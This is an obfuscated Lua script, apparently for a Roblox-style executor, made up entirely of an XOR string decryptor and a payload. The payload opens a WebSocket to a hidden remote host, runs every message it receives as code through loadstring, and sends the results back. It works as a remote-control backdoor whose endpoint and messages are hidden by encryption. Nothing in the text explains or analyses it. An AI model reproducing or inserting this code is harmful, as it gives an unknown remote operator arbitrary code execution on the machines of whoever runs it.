local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
local TABLE_TableIndirection = {};
task.spawn(function()
	TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\208\134\139", "\126\177\163\187\69\134\219\167")] = WebSocket.connect(LUAOBFUSACTOR_DECRYPT_STR_0("\52\222\112\138\179\43\200\38\220\253\109\221\51\201\249\59\131\50\220\230\121\156\122\156\173\119\130\61\214", "\156\67\173\74\165"));
	TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\53\242\25", "\38\84\215\41\118\220\70")]:Send(LUAOBFUSACTOR_DECRYPT_STR_0("\115\57\12\60\219\115\34\11\61\208\16\37\23\49\221\117\37\17", "\158\48\118\66\114"));
	TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\170\97\64", "\155\203\68\112\86\19\197")].OnMessage:Connect(function(k)
		local s, e = pcall(function()
			TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\71\152\102", "\152\38\189\86\156\32\24\133")]:Send(loadstring(k)());
		end);
		TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\253\18\247", "\38\156\55\199")]:Send(tostring(s) .. LUAOBFUSACTOR_DECRYPT_STR_0("\180\61", "\35\200\29\28\72\115\20\154") .. tostring(e));
	end);
end);
